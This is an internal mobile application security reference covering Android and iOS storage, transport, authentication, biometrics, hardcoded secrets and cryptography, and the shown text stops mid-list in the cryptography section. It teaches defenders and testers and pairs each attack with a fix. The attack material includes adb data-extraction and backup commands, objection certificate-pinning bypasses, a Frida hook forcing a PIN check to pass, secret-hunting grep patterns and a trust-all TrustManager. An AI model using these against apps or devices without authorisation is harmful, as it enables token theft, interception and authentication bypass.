# Mobile Application Security — The Complete Reference

> **Classification:** Internal Engineering / Security Study Reference
> **Audience:** Mobile engineers (Android & iOS), AppSec engineers, mobile pentesters, bug-bounty hunters, interview candidates
> **Scope:** Every major class of mobile application attack and vulnerability — Android and iOS — with mechanism, worked example, platform-specific code (Kotlin/Java, Swift/Obj-C), tooling commands, and remediation
> **Companion:** [`web_security_attacks_complete_guide.md`](./web_security_attacks_complete_guide.md) — the web equivalent. Read that first if you have not; several attacks (injection, SSRF, broken auth, deserialization) apply to mobile *backends* identically.

---

## How to read this document

Each entry follows the same skeleton so you can compare across attacks:

- **What it is** — one or two sentences.
- **Mechanism** — why the vulnerability exists at the level of what the OS and app actually do.
- **Vulnerable code / config** — a minimal example with the bug (Android or iOS, sometimes both).
- **The attack** — the exact steps, commands (`adb`, Frida, `objection`), or payload.
- **Impact** — what an attacker gains.
- **The fix** — corrected code plus the general principle.

Attacks are grouped by where they live (storage, transport, the binary, IPC, privacy). The appendices map everything to the **OWASP Mobile Top 10 (2024)** and the **OWASP MASVS/MASTG**, and list tooling and further reading.

---

## The one idea that makes mobile different from web

In web security, the attacker sends requests to *your* server; the code they attack runs on *your* infrastructure. In mobile security, **the entire client runs on a device the attacker controls.** The `.apk` / `.ipa` is downloaded, unpacked, decompiled, instrumented, and re-run under a debugger — by the attacker, at their leisure, offline.

This inverts several web assumptions:

1. **The client binary is not a secret.** Anything shipped in the app — API keys, algorithms, "hidden" endpoints, encryption logic, root-detection code — is visible to anyone who unzips the package. There is no such thing as a client-side secret.
2. **Client-side security checks are advisory, not enforcing.** Root/jailbreak detection, certificate pinning, and "is this a genuine build" checks all run *on the attacker's device* and can be patched out or hooked at runtime. They raise cost; they do not create a boundary.
3. **The real trust boundary is the server.** Every security decision that matters — authentication, authorization, business rules, price calculation — must be enforced server-side, exactly as in web. The mobile client is untrusted input to your API.
4. **Data at rest is a first-class problem.** Unlike a web page that vanishes on close, a mobile app persists data on a device that can be lost, stolen, backed up to a computer, or forensically imaged. Where and how you store data is half of mobile security.

Hold this in view: most of the vulnerabilities below are cases of trusting the client, or of leaving data recoverable on the device. The two platform security models — Android's and iOS's — are the sandboxes that everything else builds on, so start there.

---

## Table of Contents

**Part A — Platform Foundations**
1. [The Android security model](#1-the-android-security-model)
2. [The iOS security model](#2-the-ios-security-model)
3. [The mobile threat model & attacker toolkit](#3-the-mobile-threat-model--attacker-toolkit)

**Part B — Insecure Data Storage**
4. [Insecure local storage (the core problem)](#4-insecure-local-storage-the-core-problem)
5. [Android storage pitfalls](#5-android-storage-pitfalls)
6. [iOS storage pitfalls](#6-ios-storage-pitfalls)
7. [Keystore / Keychain misuse](#7-keystore--keychain-misuse)
8. [Logs, caches, clipboards & backups](#8-logs-caches-clipboards--backups)

**Part C — Insecure Communication**
9. [Cleartext & weak TLS](#9-cleartext--weak-tls)
10. [Missing certificate pinning & MITM](#10-missing-certificate-pinning--mitm)
11. [Certificate pinning bypass](#11-certificate-pinning-bypass)

**Part D — Authentication, Credentials & Cryptography**
12. [Insecure authentication & authorization](#12-insecure-authentication--authorization)
13. [Biometric authentication bypass](#13-biometric-authentication-bypass)
14. [Improper credential usage & hardcoded secrets](#14-improper-credential-usage--hardcoded-secrets)
15. [Insufficient cryptography](#15-insufficient-cryptography)

**Part E — Reverse Engineering, Tampering & Runtime Attacks**
16. [Reverse engineering the binary](#16-reverse-engineering-the-binary)
17. [Code tampering & repackaging](#17-code-tampering--repackaging)
18. [Runtime manipulation (Frida / hooking / swizzling)](#18-runtime-manipulation-frida--hooking--swizzling)
19. [Root / jailbreak detection & its bypass](#19-root--jailbreak-detection--its-bypass)
20. [Insufficient binary protections](#20-insufficient-binary-protections)

**Part F — IPC & Platform Attack Surface**
21. [Android exported components](#21-android-exported-components)
22. [Android Intent attacks & deep links](#22-android-intent-attacks--deep-links)
23. [iOS URL schemes & universal links](#23-ios-url-schemes--universal-links)
24. [WebView vulnerabilities](#24-webview-vulnerabilities)
25. [Client-side injection (SQLite, path)](#25-client-side-injection-sqlite-path)

**Part G — Privacy, Side Channels, Supply Chain & Config**
26. [Side-channel data leakage](#26-side-channel-data-leakage)
27. [Inadequate privacy controls](#27-inadequate-privacy-controls)
28. [Third-party SDK & supply chain risk](#28-third-party-sdk--supply-chain-risk)
29. [Push notifications & tokens](#29-push-notifications--tokens)
30. [Security misconfiguration & extraneous functionality](#30-security-misconfiguration--extraneous-functionality)

- [Appendix: OWASP Mobile Top 10 (2024) mapping](#appendix-owasp-mobile-top-10-2024-mapping)
- [Appendix: MASVS / MASTG mapping](#appendix-masvs--mastg-mapping)
- [Appendix: The mobile pentest toolkit](#appendix-the-mobile-pentest-toolkit)
- [Appendix: Further reading & external resources](#appendix-further-reading--external-resources)

---

# Part A — Platform Foundations

You cannot reason about mobile attacks without the sandbox model each attack tries to escape or abuse. These two sections are the ground everything else stands on.

---

## 1. The Android security model

Android is a modified Linux where **every app is a separate Linux user (UID)**. The kernel's user-based permission model is the primary sandbox: app A's UID cannot read app B's files.

**Key mechanisms:**

- **Application sandbox** — each app gets a unique UID at install and a private data directory `/data/data/<package>/` that only that UID can read. This is the strongest boundary on the device *for a non-rooted phone*.
- **Permissions** — sensitive capabilities (camera, location, contacts, SMS) are gated by permissions declared in `AndroidManifest.xml` and granted at install (normal permissions) or at runtime (dangerous permissions, since Android 6).
- **Components & the manifest** — apps are built from four component types (Activities, Services, Broadcast Receivers, Content Providers). The manifest declares each and whether it is `exported` (reachable by other apps). Exported components are the app's inter-process attack surface (§21).
- **Intents** — the message-passing system between components and apps. Explicit intents name a target; implicit intents describe an action and let the OS pick a handler. Implicit intents are a major attack surface (§22).
- **Signing** — every APK is signed; updates must be signed with the same key. This binds an app's identity to a developer key but does *not* prevent an attacker from re-signing a modified app with *their own* key and running it on their own device (§17).
- **SELinux** — mandatory access control layered on top of the UID sandbox, constraining even root-level processes.

**What the model does not protect against:** a rooted device. Root breaks the UID sandbox — a root process reads every app's private directory. Therefore, **any data on the device is recoverable by a sufficiently privileged attacker**, which is why storage encryption tied to hardware and user authentication matters (§7).

**Storage locations and their trust:**

| Location | Who can read it | Notes |
|---|---|---|
| `/data/data/<pkg>/` (internal) | Only the app's UID (and root) | The default safe location |
| `SharedPreferences` | Same as internal | XML files in the internal dir; plaintext unless encrypted |
| Internal SQLite DB | Same as internal | Plaintext on disk unless SQLCipher |
| External storage (`/sdcard`) | **Any app with storage permission (legacy), and USB** | Never store sensitive data here |
| `Keystore` | Keys are non-exportable, hardware-backed where available | The correct place for keys (§7) |

---

## 2. The iOS security model

iOS is more locked-down than Android by default, built on a hardware root of trust and a mandatory sandbox.

**Key mechanisms:**

- **App sandbox** — each app runs in a container (`/var/mobile/Containers/`) it cannot escape; it cannot read other apps' data or most of the system. Enforced by the kernel, not opt-in.
- **Code signing & the secure boot chain** — every executable page must be signed by a certificate Apple trusts; the boot chain verifies each stage. This is why running unsigned/modified code requires a jailbreak.
- **Entitlements** — capabilities (Keychain access groups, app groups, push, HealthKit) are granted by signed entitlements baked into the app at signing time.
- **Data Protection** — file-level encryption tied to the device passcode and hardware. Files have a *protection class* controlling when they are decryptable:
  - `NSFileProtectionComplete` — decryptable only while the device is unlocked.
  - `NSFileProtectionCompleteUntilFirstUserAuthentication` — the default; decryptable after first unlock following boot (so accessible in the background).
  - `NSFileProtectionNone` — always decryptable; effectively unprotected.
- **Keychain** — the system credential store, hardware-backed, with accessibility classes (e.g. `kSecAttrAccessibleWhenUnlockedThisDeviceOnly`) and optional Secure Enclave binding.
- **Secure Enclave** — a separate coprocessor holding keys and performing biometric matching; keys generated there are non-extractable.

**What the model does not protect against:** a jailbroken device. Jailbreaking disables code-signing enforcement and the sandbox, giving tools like Frida and `objection` full run of the app's memory and files. As on Android, **client-side protections run inside the attacker's reach once the device is jailbroken.**

**The recurring theme across both platforms:** the sandbox protects app A from app B on a *healthy* device. It does not protect app A from the *device owner* who has rooted/jailbroken their own phone — which is exactly the pentester's and the malware author's position.

---

## 3. The mobile threat model & attacker toolkit

Before the specific attacks, know the four attacker positions and the standard tools. Every entry below assumes one of these positions.

**Attacker positions:**

1. **Another malicious app on the device** — a game or utility the victim installed. It attacks *your* app across the IPC boundary (exported components §21, intents §22, URL schemes §23, clipboard §26). It has no root; it works within the sandbox rules.
2. **Network attacker (MITM)** — on the same Wi-Fi, a malicious hotspot, or a compromised router. Attacks communication (§9–11).
3. **Device-in-hand / device thief** — has physical access to an unlocked or lockable device. Attacks data at rest (§4–8), side channels (§26).
4. **The user themselves as attacker** — a rooted/jailbroken device fully under their control, used to reverse-engineer and instrument the app (§16–20). This is the pentester's position and the position for defeating client-side controls.

**The standard toolkit:**

```
Static analysis:
  jadx / apktool / dex2jar    — decompile Android APK/DEX to readable Java/smali
  Hopper / Ghidra / IDA       — disassemble iOS Mach-O binaries
  class-dump / dsdump         — dump Objective-C/Swift class headers from an iOS binary
  MobSF                       — automated static+dynamic analysis for both platforms
  strings / grep              — find hardcoded secrets in the binary

Dynamic analysis / instrumentation:
  Frida                       — inject JavaScript into a running app to hook any function
  objection                  — Frida-based toolkit: pinning bypass, root detection bypass,
                                Keychain dump, memory search, all without writing scripts
  adb                        — Android Debug Bridge: shell, file pull, logcat, component invocation
  Burp Suite / mitmproxy     — intercepting HTTPS proxy (needs the CA trusted + pinning bypassed)
  Cycript / LLDB             — iOS runtime manipulation and debugging
  drozer                     — Android IPC attack framework (exported components, intents)

Device prep:
  Rooted Android emulator/device, or jailbroken iOS (checkra1n/palera1n/Dopamine era)
  Genymotion / Android Studio emulator (root by default)
```

The mental model for the rest of the document: assume the attacker has all of these and full control of the device. Your job is to move the security decisions to where they cannot reach — the server — and to make what remains on the device expensive to extract and useless if extracted.

---
# Part B — Insecure Data Storage

The most common serious mobile finding, and the one with no web equivalent: the app leaves recoverable sensitive data on a device that can be lost, stolen, backed up, or imaged. OWASP ranks it **M9**. The universal principle: **store as little as possible, encrypt what you must store with keys held in hardware-backed storage, and never put secrets where another app or a backup can reach them.**

---

## 4. Insecure local storage (the core problem)

**What it is:** Sensitive data — session tokens, passwords, PII, PANs, encryption keys — written to the device in plaintext or with keys that are themselves recoverable.

**Mechanism:** Developers reach for the convenient store (`SharedPreferences`, a plist, a SQLite table, a file) and write the token directly. On a healthy device the sandbox protects it from *other apps*. But it does not protect it from: a rooted/jailbroken device, a full-device or cloud backup, a forensic image, or a shared/external storage location. The data sits in cleartext for anyone who crosses one of those boundaries.

### The attack (Android, rooted device)

```bash
# Pull the app's private data directory and read the token in plaintext
adb root
adb shell "run-as com.example.app cat /data/data/com.example.app/shared_prefs/auth.xml"
# <string name="session_token">eyJhbGciOi...</string>   ← plaintext session token

# Or dump the whole internal directory for offline analysis
adb exec-out run-as com.example.app tar c . > appdata.tar
```

### The attack (iOS, jailbroken)

```bash
# Browse the app container and read the plist / SQLite in plaintext
objection -g "MyApp" explore
# then: ios plist cat /var/mobile/Containers/.../Library/Preferences/com.example.plist
# or pull the container and grep for tokens, emails, card numbers
```

### The fix — the decision tree

```
Does it need to be on the device at all?
  NO  → don't store it. Keep it server-side; fetch on demand.
  YES → Is it a key or a small secret (token, credential)?
          YES → Keychain (iOS) / Keystore-backed EncryptedSharedPreferences (Android)
          NO (bulk data) → encrypt with a key from Keystore/Keychain; store ciphertext
```

**The principle:** the safe default is *do not persist secrets*. Session tokens should be short-lived and re-fetched; where storage is unavoidable, encrypt with a key that lives in the hardware-backed keystore and never leaves it. Plaintext on disk is a finding regardless of the sandbox, because the sandbox is not the boundary you are defending against.

---

## 5. Android storage pitfalls

Each Android storage mechanism has a specific failure mode.

### SharedPreferences — plaintext XML

```kotlin
// VULNERABLE — writes plaintext XML to /data/data/<pkg>/shared_prefs/
val prefs = getSharedPreferences("auth", MODE_PRIVATE)
prefs.edit().putString("token", sessionToken).apply()

// FIXED — EncryptedSharedPreferences, key held in the Android Keystore
val masterKey = MasterKey.Builder(context)
    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
    .build()
val securePrefs = EncryptedSharedPreferences.create(
    context, "auth_secure", masterKey,
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
)
securePrefs.edit().putString("token", sessionToken).apply()  // ciphertext on disk
```

### `MODE_WORLD_READABLE` / `MODE_WORLD_WRITEABLE` — cross-app exposure

These legacy `Context` modes made files readable/writable by *every* app. Deprecated and throw on modern Android, but still appear in old code. Never use them; always `MODE_PRIVATE`.

### External storage — readable by other apps and USB

```kotlin
// VULNERABLE — /sdcard is shared; any app with storage permission reads it,
// and it survives uninstall and appears over USB/MTP
File(Environment.getExternalStorageDirectory(), "secret.txt").writeText(token)
```
Never write sensitive data to external storage. Use `context.filesDir` (internal, private) and encrypt.

### SQLite — plaintext database files

Internal SQLite databases are private to the app's UID but stored **unencrypted on disk**. On a rooted device or in a backup they are readable. Use **SQLCipher** for at-rest encryption if the data is sensitive, with the key from the Keystore.

### `allowBackup` — the token in the cloud backup

```xml
<!-- VULNERABLE — the app's private data is included in adb backup / cloud backup -->
<application android:allowBackup="true" ...>

<!-- FIXED — exclude sensitive data from backup, or disable it -->
<application android:allowBackup="false"
            android:fullBackupContent="@xml/backup_rules" ...>
```
```bash
# The attack if allowBackup=true (no root needed on older devices):
adb backup -f app.ab com.example.app     # extract the backup
# unpack app.ab → read the "private" shared_prefs and databases in plaintext
```

---

## 6. iOS storage pitfalls

### `UserDefaults` (plist) — plaintext, and backed up

```swift
// VULNERABLE — UserDefaults is a plaintext plist in the app container,
// included in iTunes/iCloud backups
UserDefaults.standard.set(sessionToken, forKey: "token")

// FIXED — use the Keychain for secrets (see §7)
```
`UserDefaults` is for non-sensitive preferences only. Tokens, passwords, and keys never belong there.

### Files with the wrong Data Protection class

```swift
// VULNERABLE — NSFileProtectionNone: readable even on a locked device
try data.write(to: url, options: .noFileProtection)

// FIXED — Complete: decryptable only while the device is unlocked
try data.write(to: url, options: .completeFileProtection)
```
The default (`CompleteUntilFirstUserAuthentication`) is acceptable for background access but means data is decryptable any time after the first post-boot unlock. For the most sensitive data, use `.completeFileProtection`.

### Core Data / SQLite — plaintext store

Core Data's underlying SQLite store is not encrypted by default; rely on Data Protection (a strong device passcode) plus, for high-sensitivity data, an encrypted store or Keychain-held key.

### The iOS backup exposure

```
Anything in the app container that is not excluded is included in encrypted
iTunes/iCloud backups. A backup pulled to a computer and decrypted exposes it.
FIX: mark sensitive files with `isExcludedFromBackup = true`, and keep true
secrets in the Keychain (which has its own backup accessibility controls).
```

---

## 7. Keystore / Keychain misuse

**What it is:** The hardware-backed key stores exist precisely so keys never sit in app memory or on disk — but they are frequently misconfigured so the protection is lost.

### Android Keystore — the right way, and the wrong way

```kotlin
// FIXED — generate a key IN the Keystore; it is non-exportable and can be
// bound to hardware (StrongBox) and to user authentication.
val keyGen = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore")
keyGen.init(
    KeyGenParameterSpec.Builder("app_key",
        KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT)
        .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
        .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
        .setUserAuthenticationRequired(true)          // gate use behind biometric/PIN
        .setUnlockedDeviceRequired(true)
        .setIsStrongBoxBacked(true)                   // dedicated secure hardware if present
        .build()
)
val key = keyGen.generateKey()   // the raw key bytes NEVER leave the Keystore
```

**Common misuse:** generating the AES key in app code and merely *storing* it in SharedPreferences ("we encrypt the token!" — but the key is next to it in plaintext), or hardcoding the key in the source (§14). If the key is recoverable, the encryption is decoration.

### iOS Keychain — accessibility and Secure Enclave

```swift
// FIXED — store a token in the Keychain, restricted to this device,
// only when unlocked, and (optionally) gated by biometrics.
let query: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrAccount as String: "session",
    kSecValueData as String: tokenData,
    // ThisDeviceOnly → never synced to iCloud, never restored to another device
    kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly
]
SecItemAdd(query as CFDictionary, nil)
```

**Common misuse:** `kSecAttrAccessibleAlways` (deprecated — readable even when locked), or storing a token in `UserDefaults` "because the Keychain API is fiddly." For the strongest binding, generate keys in the **Secure Enclave** (`kSecAttrTokenIDSecureEnclave`) so they are non-extractable and require biometric/passcode use.

**The principle:** keys must be generated in and never leave the hardware-backed store; their *use* should be gated by user authentication for anything sensitive; and they must be device-bound (not synced) unless you have a specific reason otherwise. Encryption with a recoverable key provides no protection.

---

## 8. Logs, caches, clipboards & backups

**What it is:** Sensitive data leaking into places developers forget are persistent or shared — the debug log, framework caches, the system clipboard, keyboard caches, and backups.

### Logs

```kotlin
// VULNERABLE — logcat is readable by adb, and on older Android by other apps
Log.d("Auth", "login response: $responseBodyWithToken")

// On device: adb logcat | grep -i token   → harvest tokens, PII, full responses
```
Never log tokens, credentials, PII, or full request/response bodies. Strip debug logging from release builds (ProGuard/R8 can remove `Log.*` calls).

### WebView & HTTP caches

WebViews cache pages, form data, and sometimes credentials to disk. HTTP client caches store responses. Both can persist sensitive responses. Disable caching for authenticated content and clear WebView caches on logout.

### The clipboard — readable by every app

```swift
// VULNERABLE — anything copied is readable by ALL apps (and synced across
// devices via Universal Clipboard)
UIPasteboard.general.string = otpCode

// A malicious background app polls UIPasteboard.general.string and harvests
// OTPs, passwords pasted from a manager, crypto wallet addresses.
```
Avoid placing secrets on the clipboard; if unavoidable (e.g. "copy OTP"), use an expiring pasteboard item and clear it. On Android, mark sensitive `EditText` fields and avoid programmatic copies of secrets.

### Keyboard cache & autofill

Text typed into non-secure fields is learned by the keyboard's predictive cache and can resurface. Mark password/secret fields correctly (`inputType="textPassword"` on Android; `isSecureTextEntry = true` and `textContentType` on iOS) so the keyboard does not cache or suggest them.

### App-switcher snapshot

Covered as a side channel in §26 — the OS screenshots your app when it backgrounds, and that image can contain visible secrets.

**The principle:** sensitive data leaks through the *incidental* stores as often as the deliberate ones. Audit logs, caches, the clipboard, keyboard behaviour, and backup inclusion for every sensitive value, not just your primary datastore.

---

# Part C — Insecure Communication

The network attacker (position 2) sits between the app and your API. OWASP ranks weak communication **M5**. Two failures dominate: not using TLS properly, and — even with TLS — not pinning, so a user-installed or malicious CA enables interception. The twist unique to mobile is that pinning is both the strongest defence *and* something the attacker can rip out of their own device.

---

## 9. Cleartext & weak TLS

**What it is:** Traffic sent over HTTP, or over HTTPS with validation disabled or downgraded, so a network attacker reads and modifies it.

### The attack

A MITM on the same network reads cleartext HTTP directly, or presents their own certificate to an app that does not validate it — capturing credentials, tokens, and the full API traffic, and injecting responses.

### Android — block cleartext at the platform level

```xml
<!-- res/xml/network_security_config.xml -->
<network-security-config>
    <base-config cleartextTrafficPermitted="false">   <!-- no HTTP anywhere -->
        <trust-anchors>
            <certificates src="system"/>               <!-- system CAs only... -->
            <!-- NOT "user" — excluding user CAs blocks the trivial proxy MITM -->
        </trust-anchors>
    </base-config>
</network-security-config>
```
```xml
<application android:networkSecurityConfig="@xml/network_security_config"
             android:usesCleartextTraffic="false" ...>
```

The critical detail: by **not** trusting `user` certificate anchors, the app ignores CAs the user (or an attacker) installs — which is how a proxy like Burp normally intercepts. This alone defeats the casual MITM.

### iOS — App Transport Security

```xml
<!-- Info.plist — ATS enforces HTTPS with modern TLS by default. -->
<!-- VULNERABLE: developers disable it wholesale to "make it work": -->
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key><true/>   <!-- turns ATS OFF entirely -->
</dict>
<!-- FIXED: leave ATS on; if one domain genuinely needs an exception, scope it
     narrowly with NSExceptionDomains, never NSAllowsArbitraryLoads. -->
```

### The `TrustManager` / `URLSession` anti-pattern

```kotlin
// CATASTROPHIC — a TrustManager that accepts every certificate.
// Ships in real apps to silence a cert error during development.
val trustAll = object : X509TrustManager {
    override fun checkServerTrusted(c: Array<X509Certificate>, a: String) {}   // accepts anything
    override fun checkClientTrusted(c: Array<X509Certificate>, a: String) {}
    override fun getAcceptedIssuers() = arrayOf<X509Certificate>()
}
// Any MITM certificate is now accepted. Never ship this.
```

**The principle:** enforce HTTPS with modern TLS everywhere (ATS on iOS, `cleartextTrafficPermitted=false` on Android), never disable certificate validation, and exclude user-installed CAs from the trust anchors so a proxy CA does not silently enable interception.

---

## 10. Missing certificate pinning & MITM

**What it is:** Even with correct TLS, the app trusts the whole CA system. An attacker who can get *any* trusted CA to issue a certificate for your domain (mis-issuance, a compromised CA, a corporate MITM appliance, or a user tricked into installing a CA) can intercept. **Pinning** restricts trust to *your specific* certificate or public key.

### Android — pin in the network security config

```xml
<network-security-config>
    <domain-config>
        <domain includeSubdomains="true">api.example.com</domain>
        <pin-set expiration="2026-12-31">
            <!-- pin the SPKI hash of your leaf or intermediate key -->
            <pin digest="SHA-256">k3X... (base64 SPKI SHA-256)</pin>
            <!-- ALWAYS include a backup pin for a not-yet-deployed key -->
            <pin digest="SHA-256">bkp... (backup key hash)</pin>
        </pin-set>
    </domain-config>
</network-security-config>
```

### iOS — pin by validating the server key/cert

```swift
// URLSessionDelegate: compare the server's public key hash to a pinned value
func urlSession(_ s: URLSession, didReceive challenge: URLAuthenticationChallenge,
                completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
    guard let trust = challenge.protectionSpace.serverTrust,
          let key = SecTrustCopyKey(trust),
          pinnedKeyHashes.contains(sha256(SecKeyCopyExternalRepresentation(key, nil)! as Data))
    else { completionHandler(.cancelAuthenticationChallenge, nil); return }
    completionHandler(.useCredential, URLCredential(trust: trust))
}
```

**Pin the public key (SPKI), not the certificate** — certificates rotate on renewal but you can keep the same key, so key-pinning survives renewal. **Always ship a backup pin** for your next key, or a key rotation bricks every installed app until they update.

**The principle:** pinning turns "trust ~150 CAs" into "trust exactly my key," which defeats CA-based MITM. It is the strongest transport control on mobile — with the operational caveat that a botched pin update is a self-inflicted outage, so pin the key, keep backups, and set an expiration.

---

## 11. Certificate pinning bypass

**What it is:** Because pinning runs *on the attacker's device*, a pentester (or malware on a rooted device) rips it out to intercept the app's traffic. Understanding the bypass is essential both for testing your own app and for calibrating what pinning actually buys.

### The bypass (attacker position 4 — rooted/jailbroken)

```bash
# objection disables the app's pinning at runtime with one command
objection -g com.example.app explore
android sslpinning disable          # or: ios sslpinning disable

# Or a Frida script that hooks the pinning check and forces it to pass.
# Or patch the network_security_config out of the APK and re-sign (§17).
# Or, on Android <7 or apps trusting user CAs, just install Burp's CA and proxy.
```

### What this means for defenders

Pinning is **not defeated for the ordinary network attacker** (position 2) — they cannot instrument the victim's non-rooted device, so pinning genuinely stops their MITM. It *is* defeated for the on-device attacker (position 4), who can hook anything.

**The correct conclusion:** pinning is worth doing — it stops real MITM against real users — but you must not treat "traffic is pinned" as "the API is safe from tampering." Every security decision still has to be enforced server-side, because a determined attacker on their own device will always see and modify their own app's traffic. Pinning raises cost and stops network attackers; it is not a server-side control.

**Defence in depth around pinning:** combine with root/jailbreak detection (§19, also bypassable but raises cost), attestation (Play Integrity API / Apple App Attest — server-verified signals that the app and device are genuine, which are far harder to forge than client-side checks), and — always — server-side enforcement of everything that matters.

---
# Part D — Authentication, Credentials & Cryptography

The device is untrusted, so authentication decisions cannot be made on it. OWASP splits this into **M1 (improper credential usage)**, **M3 (insecure authentication/authorization)**, and **M10 (insufficient cryptography)**. The unifying rule: the client *collects* credentials and *presents* proofs; the *server* decides.

---

## 12. Insecure authentication & authorization

**What it is:** Authentication or authorization logic performed or trusted on the client, allowing an attacker on their own device to bypass it — or a backend that trusts client-asserted identity.

### The anti-patterns

```kotlin
// 1. CLIENT-SIDE AUTH DECISION — the app decides if login succeeded
if (enteredPin == storedPinFromPrefs) { unlockApp() }
// Attacker hooks the comparison to always return true (Frida), or reads
// storedPin from prefs. There is no server involved. Trivially bypassed.

// 2. CLIENT-ASSERTED IDENTITY — the server trusts a user id from the request
GET /api/account?user_id=12345      // change to 12346 → another user's account (IDOR)

// 3. "OFFLINE MODE" that grants full access with a locally-checked credential
// 4. HIDDEN ADMIN UNLOCK — a debug gesture/code that elevates locally
```

### The Frida bypass of a client-side check

```javascript
// Force a boolean auth check to always return true, at runtime
Java.perform(function () {
  var Auth = Java.use('com.example.app.AuthManager');
  Auth.isPinValid.implementation = function (pin) {
    return true;   // the app now unlocks for any PIN
  };
});
```

### The fix / principle

- **Authenticate against the server.** The client sends credentials over pinned TLS; the server verifies and returns a token. A local PIN/biometric should *unlock a securely-stored server token*, not *be* the authentication.
- **Authorize on the server for every request.** Never trust a `user_id`, `role`, or `is_premium` flag sent by the client. Derive identity from the session/token server-side (this is IDOR §30 in the web guide, and it is identical here).
- **Assume every client-side check is bypassable.** Client checks improve UX and raise cost; they are never the authorization boundary.

---

## 13. Biometric authentication bypass

**What it is:** Biometric prompts (Touch ID / Face ID / BiometricPrompt) implemented as a UI gate rather than as a cryptographic operation, so an attacker skips the prompt entirely.

**Mechanism:** There are two ways to use biometrics. The weak way is an **event-based** callback: "if `onAuthenticationSucceeded` fires, show the secret." An attacker hooks the callback or calls the success path directly — no fingerprint needed. The strong way is **key-bound**: the biometric unlocks a Keystore/Keychain/Secure Enclave key that is *required* to decrypt the data, so skipping the prompt yields nothing usable.

### Vulnerable (event-based) vs fixed (key-bound) — Android

```kotlin
// VULNERABLE — decision by callback; the secret is available regardless
biometricPrompt.authenticate(promptInfo)
override fun onAuthenticationSucceeded(result) {
    showSecret(decrypt(loadCiphertext(), keyLoadedAnyway))   // key not tied to auth
}
// Frida: call onAuthenticationSucceeded directly, or flip the branch. Bypassed.

// FIXED — the biometric unlocks a Keystore key that is REQUIRED to decrypt.
// setUserAuthenticationRequired(true) on the key (see §7) means the CryptoObject
// only becomes usable after a genuine biometric match; there is no code path
// that decrypts without it.
val cipher = Cipher.getInstance("AES/GCM/NoPadding")
cipher.init(Cipher.DECRYPT_MODE, keystoreKey, GCMParameterSpec(128, iv))
biometricPrompt.authenticate(promptInfo, BiometricPrompt.CryptoObject(cipher))
// only inside onAuthenticationSucceeded is `cipher` actually authorized to decrypt
```

### iOS — bind to the Secure Enclave, not to `LAContext` alone

```swift
// WEAK — evaluatePolicy returns a boolean the attacker can force
context.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, ...) { success, _ in
    if success { self.reveal(secret) }        // hookable boolean
}

// STRONG — the Keychain item requires biometric presence to be READ, enforced
// by the Secure Enclave, so there is no boolean to bypass.
let access = SecAccessControlCreateWithFlags(nil,
    kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
    .biometryCurrentSet, nil)   // invalidates if the enrolled biometric set changes
let query: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrAccount as String: "token",
    kSecAttrAccessControl as String: access!,
    kSecUseOperationPrompt as String: "Unlock your account"
]
// Reading this item forces a biometric match at the OS/enclave level.
```

**The principle:** biometrics must gate access to a *cryptographic key*, not to a code branch. Use `CryptoObject` (Android) / access-control-flagged Keychain items backed by the Secure Enclave (iOS). Set `.biometryCurrentSet` / `setInvalidatedByBiometricEnrollment(true)` so adding a new fingerprint/face (e.g. an attacker enrolling theirs) invalidates the key.

---

## 14. Improper credential usage & hardcoded secrets

**What it is:** Secrets — API keys, private keys, credentials, encryption keys, third-party tokens — embedded in the app binary, where anyone who unpacks it can read them. OWASP **M1**.

**Mechanism:** There is no client-side secret. Strings, resources, native libraries, and even "obfuscated" constants are all recoverable from the shipped package. Obfuscation slows a reader; it does not hide the value from a debugger that watches it being *used*.

### The attack

```bash
# Android — strings and grep find most hardcoded secrets in seconds
apktool d app.apk -o out/
grep -rEi 'api[_-]?key|secret|password|token|BEGIN (RSA|EC) PRIVATE KEY' out/
strings out/lib/arm64-v8a/libnative.so | grep -Ei 'key|secret|https?://'

# iOS
strings MyApp.app/MyApp | grep -Ei 'api|key|secret|token'
# class-dump / Hopper reveal string constants and their use sites
```

Real-world impact: AWS keys with broad permissions, third-party API keys billed to the company, signing keys, and backend admin credentials have all shipped inside mobile apps and been extracted at scale.

### The fix / principle

- **Do not ship secrets that grant server-side power.** Anything that lets the client do something privileged must be brokered by *your* backend, which holds the real secret and enforces authorization. The app calls your API; your API calls the third party.
- **Use scoped, per-user, revocable tokens** obtained at runtime after authentication — never a shared static key baked into every install.
- **For keys that must exist on the device** (e.g. a per-device encryption key), *generate* them on-device in the Keystore/Secure Enclave (§7) so they are never in the binary and never leave hardware.
- **Obfuscation (R8/ProGuard, string encryption) is defence in depth, not a control.** It raises the cost of static analysis; it never protects a secret that is used at runtime, because the attacker hooks the point of use.
- **Scan for secrets in CI** (truffleHog, gitleaks, MobSF) so a hardcoded key never reaches a release.

---

## 15. Insufficient cryptography

**What it is:** Mobile-specific cryptographic failures — home-grown crypto, hardcoded keys (§14), weak algorithms, misused modes, and the recurring mistake of encrypting data with a key that is itself recoverable. OWASP **M10**. (The general crypto pitfalls in the web guide's §41 all apply; these are the mobile-flavoured ones.)

### The mobile-specific failures

```
# 1. "Encryption" with a key stored next to the ciphertext, or hardcoded
val key = "MySecretKey12345"                 // in the binary → extractable → useless
FIX: generate the key in the Keystore/Secure Enclave; never in code (§7)

# 2. ECB mode / static IV — patterns leak; identical plaintext → identical ciphertext
Cipher.getInstance("AES/ECB/PKCS5Padding")   // never ECB
FIX: AES-GCM with a fresh random IV per operation

# 3. Deprecated primitives still common in old mobile code
MD5, SHA-1, DES, RC4, RSA-512/1024
FIX: SHA-256+, AES-256-GCM, RSA-2048+/ECC, Argon2/bcrypt for passwords

# 4. Insecure randomness for keys/tokens/IVs
Random() / arc4random() misuse
